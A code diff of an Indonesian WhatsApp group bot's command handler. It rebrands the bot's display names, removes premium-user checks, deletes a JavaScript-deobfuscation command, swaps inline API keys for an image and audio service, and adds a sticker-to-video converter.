 					VxoZap.sendButtons(m.chat, {
 						"body": "\`\`\`「 MODE AUTO BIO 」\`\`\`",
-						"footer": "⿻  ⌜ 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ ⌟  ⿻",
+						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
 						"buttons": [{
 								"displayText": "ON",
 								"id": `${prefix + command} 1`
@@ -3560,67 +4221,16 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				// SS WEB \\
 				//=================================================//
 			case "ssweb": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`*Example: \nSspc Link`)
 				let desktop = await ssweb(text, "desktop")
 				VxoZap.sendFile(m.chat, desktop.result, "", ``, m, false)
 			}
 			break
 			//=================================================//
-case 'dec': case 'decrypt': {
-await VxoZap.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });
-const { webcrack } = await import('webcrack');
-const usage = `Contoh:
-${command} (Input text or reply text to dec code)
-${command} doc (Reply to a document)`;
 
-// Pengecekan khusus owner
-if (!isPremium) return zreply('*Ngapain Bang? Mau Sewa Bot Decrypt? Pm aja 6283827666602,Terjamin Banyak Fitur Menarik*');
-
-let text;
-if (args.length >= 1) {
-text = args.join(" ");
-} else if (m.quoted && m.quoted.text) {
-text = m.quoted.text;
-} else {
-return zreply(usage);
-}
-
-try {
-let message;
-if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
-let docBuffer;
-if (m.quoted.mimetype) {
-docBuffer = await m.quoted.download();
-}
-message = await webcrack(docBuffer.toString('utf-8'));
-} else {
-message = await webcrack(text);
-}
-
-// Simpan hasil ke dalam file @Jackdecrypt.js
-const filePath = './@Jackdecrypt.js';
-fs.writeFileSync(filePath, message.code);
-
-// Kirim file @Jack.txt
-await VxoZap.sendMessage(m.chat, {
-document: {
-url: filePath
-},
-mimetype: 'application/javascript',
-fileName: 'Decrypt By @Jack.js'
-}, {quoted: m});
-
-} catch (error) {
-const errorMessage = `Terjadi kesalahan: ${error.message}`;
-await zreply(errorMessage);
-}
-}
-break
 			//Group Vitur\\
 			//=================================================//
 			case "add": {
-				
 				if (!isCreator) return zreply(mess.owner);
 				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
 				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
@@ -3629,7 +4239,6 @@ break
 			break
 			//=================================================//
 			case "kick": {
-				
 				if (!isCreator) return zreply(mess.owner);
 				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
 				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
@@ -3638,7 +4247,6 @@ break
 			break
 			//=================================================//
 			case "promote": {
-				
 				if (!isCreator) return zreply(mess.owner);
 				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
 				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
@@ -3647,7 +4255,6 @@ break
 			break
 			//=================================================//
 			case "demote": {
-				
 				if (!isCreator) return zreply(mess.owner);
 				if (!Inputo) return zreply("Reply pesan/Tag orang/Nomer")
 				if (Inputo.startsWith("08")) return zreply("Gunakan kode negara!")
@@ -3655,7 +4262,6 @@ break
 			}
 			break
 			case "getppgc":
-				if (!isPremium) return zreply(mess.premium)
 				if (!isGroup) return
 				zreply(mess.wait)
 				try {
@@ -3673,7 +4279,6 @@ break
 				})
 				break
 			case 'join': {
-				
 				if (!isCreator) return zreply(mess.owner);
 				if (!text) return zreply(`Masukan Link Group !`)
 				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return zreply(`Link Eror !`)
@@ -3691,7 +4296,6 @@ break
 			break
 			case "getpic":
 			case "getpp": {
-				if (!isPremium) return zreply(mess.premium)
 				if (Inputo) {
 					try {
 						var ppWong = await VxoZap.profilePictureUrl(Inputo, "image")
@@ -3725,7 +4329,6 @@ break
 			break
 			//=================================================//
 			case "hidetag":
-				if (!isPremium) return zreply(mess.premium)
 				if (!isGroup) return zreply(mess.only.group)
 				if (!q) return zreply(`Masukan Teks!!`)
 				VxoZap.sendMessage(m.chat, {
@@ -3741,7 +4344,6 @@ break
 				break
 				//=================================================//
 			case "tagsubject":
-				if (!isPremium) return zreply(mess.premium)
 				if (!isGroup) return zreply(mess.only.group)
 				if (!q) return zreply(`Masukan Teks!!`)
 				VxoZap.sendMessage(m.chat, {
@@ -3757,7 +4359,6 @@ break
 				break
 				//=================================================//
 			case "tagall": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isGroup) return zreply(mess.only.group)
 				if (!q) return zreply(`Masukan Teks!!`)
 				let teks = `${q ? q : ""}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
@@ -3775,7 +4376,6 @@ break
 			//=================================================//
 			case "setppgroup":
 			case "setppgc": {
-				
 				if (!isCreator) return zreply(mess.usingsetpp)
 				if (!isGroup) return zreply("Only Group")
 				if (!quoted) return zreply(`*Where Is The Picture?*`)
@@ -3818,7 +4418,6 @@ break
 			// LIST OWN && PREM \\
 			//=================================================//
 			case "listowner": {
-				if (!isPremium) return zreply(mess.premium)
 				const data = kontributor
 				let teks = "*LIST OWNER*\n\n"
 				for (const x of data) {
@@ -3829,7 +4428,6 @@ break
 			}
 			break
 			case "listprem": {
-				if (!isPremium) return zreply(mess.premium)
 				const data = getAllPremiumUser(orgkaya).map((x) => x.split("@")[0])
 				let teks = "*LIST PREMIUM*\n\n"
 				for (const x of data) {
@@ -3844,34 +4442,23 @@ break
 			// BOT SETTINGS \\
 			//=================================================//
 			case "setpp": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner);
-				if (m.quoted) {
-					const media = await VxoZap.downloadAndSaveMediaMessage(quoted)
-					const {
-						img
-					} = await generateProfilePicture(media)
-					await VxoZap.query({
-						tag: "iq",
-						attrs: {
-							to: botNumber,
-							type: "set",
-							xmlns: "w:profile:picture"
-						},
-						content: [{
-							tag: "picture",
-							attrs: {
-								type: "image"
-							},
-							content: img
-						}]
-					})
-					await zreply(`${mess.success}`)
-				} else zreply("Reply Fotonya!!")
+				if (!quoted) return zreply(`Mana Gambarnya? Reply Gambar Dengan Caption ${prefix + command}`);
+				try {
+					let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
+					if (!mime.startsWith("image/")) return reply(`FOTO njrr`);
+					if (/webp/.test(mime)) return reply(`sini muka lu ku tempelin stiker anjg!`);
+					let media = await VxoZap.downloadMediaMessage(quoted);
+					if (!media) return reply(`gagal mengunduh gambar, coba lagi nanti!`);
+					await VxoZap.updateProfilePicture(botNumber, media);
+					zreply(`Succes`);
+				} catch (error) {
+					console.error(error);
+					zreply(`aduhh, ada error nih : ${error}`);
+				}
 			}
 			break
 			case "delpp": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner);
 				VxoZap.removeProfilePicture(VxoZap.user.id)
 				zreply(mess.succes)
@@ -3881,12 +4468,11 @@ break
 			// CONVERT \\
 			//=================================================//
 			case "soundtxt": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!q) return zreply("Silakan Masukkan Teks Yang Ingin Diubah Menjadi Suara.")
 				zreply("Mengunduh Audio, Harap Tunggu...")
 				try {
 					let query = encodeURIComponent(q.trim());
-					let url = `https://api.betabotz.eu.org/api/sound/texttosound?text1=${q}&lang=id-ID&apikey=GetsuZo`;
+					let url = `https://api.betabotz.eu.org/api/sound/texttosound?text1=${q}&lang=id-ID&apikey=XpoX`;
 					let response = await axios.get(url);
 
 					if (response.data.status) {
@@ -3911,7 +4497,6 @@ break
 			case "sticker":
 			case "stiker":
 			case "s": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!quoted) return zreply(`Reply Video/Foto!!`)
 				if (/image/.test(mime)) {
 					let media = await quoted.download()
@@ -3933,7 +4518,6 @@ break
 			break
 			//=================================================//
 			case "smeme": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!text) return zreply(`Reply Foto!!`)
 				if (!quoted) return zreply(`Reply Foto!!`)
 				if (/image/.test(mime)) {
@@ -3962,7 +4546,6 @@ break
 			break
 			case "toimage":
 			case "toimg": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!/webp/.test(mime)) return zreply(`Reply Sticker!!`)
 				zreply(mess.wait)
 				let media = await VxoZap.downloadAndSaveMediaMessage(qmsg)
@@ -3980,10 +4563,27 @@ break
 				})
 			}
 			break
+			case "tomp4":
+			case "tovideo": {
+				if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`)
+				if (!quoted) return setReply("Reply Image")
+				if (!/webp/.test(mime)) return setReply(`*reply sticker with caption* *${prefix + command}*`)
+				let media = await VxoZap.downloadAndSaveMediaMessage(quoted)
+				let webpToMp4 = await webp2mp4File(media)
+				await VxoZap.sendMessage(m.chat, {
+					video: {
+						url: webpToMp4.result,
+						caption: "Convert Webp To Video"
+					}
+				}, {
+					quoted: Zets
+				})
+				await fs.unlinkSync(media)
+			}
+			break
 			//=================================================//
 			case "toaud":
 			case "toaudio": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!/video/.test(mime) && !/audio/.test(mime)) return zreply(`Reply Video!!`)
 				zreply(mess.wait)
 				let media = await VxoZap.downloadMediaMessage(qmsg)
@@ -3997,7 +4597,6 @@ break
 			}
 			break
 			case 'hdr': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!quoted) return zreply(`Reply Foto!!`);
 				if (/image/.test(mime)) {
 					zreply(mess.wait);
@@ -4012,7 +4611,7 @@ break
 					let uploadImage = require('./system/lib/uploadImage')
 					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
 					let link = await (isTele ? uploadImage : uploadFile)(media)
-					let url = `https://api.betabotz.eu.org/api/tools/remini-v3?url=${link}&resolusi=4&apikey=GetsuZo`;
+					let url = `https://api.betabotz.eu.org/api/tools/remini-v3?url=${link}&resolusi=4&apikey=XpoX`;
 					var anu = await fetchJson(url);
 					var hassdl = anu.url;
 					await VxoZap.sendMessage(m.chat, {
@@ -4027,7 +4626,6 @@ break
 			}
 			break
 			case 'recolor': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!quoted) return zreply(`Reply Foto!!`);
 				if (/image/.test(mime)) {
 					zreply(mess.wait);
@@ -4042,14 +4640,14 @@ break
 					let uploadImage = require('./system/lib/uploadImage')
 					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
 					let link = await (isTele ? uploadImage : uploadFile)(media)
-					let url = `https://api.betabotz.eu.org/api/tools/recolor?url=${link}&apikey=GetsuZo`;
+					let url = `https://api.betabotz.eu.org/api/tools/recolor?url=${link}&apikey=XpoX`;
 					var anu = await fetchJson(url);
 					var hassdl = anu.result;
 					await VxoZap.sendMessage(m.chat, {
 						image: {
 							url: hassdl
 						},
-						caption: "𝐑𝐞𝐜𝐨𝐥𝐨𝐫✨"
+						caption: "𝐑𝐞𝐜𝐨𝐥𝐨𝐫🎭"
 					}, {
 						quoted: Zets
 					});
@@ -4057,7 +4655,6 @@ break
 			}
 			break
 			case 'removebg': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!quoted) return zreply(`Reply Foto!!`)
 				if (/image/.test(mime)) {
 					zreply(mess.wait);
@@ -4072,7 +4669,7 @@ break
 					let uploadImage = require('./system/lib/uploadImage')
 					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
 					let link = await (isTele ? uploadImage : uploadFile)(media)
-					let url = `https://api.betabotz.eu.org/api/tools/removebg?url=${link}&apikey=GetsuZo`;
+					let url = `https://api.betabotz.eu.org/api/tools/removebg?url=${link}&apikey=XpoX`;
 					var anu = await fetchJson(url);
 					var hassdl = anu.url.result;
 					await VxoZap.sendMessage(m.chat, {
@@ -4087,7 +4684,6 @@ break
 			}
 			break
 			case "hd": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!quoted) return zreply(`*Fotonya Mana?*`)
 				if (!/image/.test(mime)) return zreply(`*Reply Foto!!*`)
 				zreply(mess.wait)
@@ -4103,7 +4699,6 @@ break
 			break
 			//=================================================//
 			case "tourl": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!/video/.test(mime) && !/image/.test(mime)) return zreply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
 				if (!quoted) return zreply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
 				let q = m.quoted ? m.quoted : m
@@ -4130,7 +4725,7 @@ break
 									isForwarded: true,
 									forwardedNewsletterMessageInfo: {
 										newsletterJid: global.xchannel.jid,
-										newsletterName: '𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️',
+										newsletterName: '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉',
 										serverMessageId: -1
 									},
 									businessMessageForwardInfo: {
@@ -4145,7 +4740,7 @@ break
 								}),
 								header: proto.Message.InteractiveMessage.Header.create({
 									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
-									subtitle: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+									subtitle: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
 									hasMediaAttachment: true,
 									...(await prepareWAMessageMedia({
 										image: {
@@ -4175,7 +4770,6 @@ break
 			}
 			break
 			case "tourlvid": {
-				if (!isPremium) return zreply(mess.premium)
 				if (!/video/.test(mime) && !/image/.test(mime)) return zreply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
 				if (!quoted) return zreply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
 				let q = m.quoted ? m.quoted : m
@@ -4202,7 +4796,7 @@ break
 									isForwarded: true,
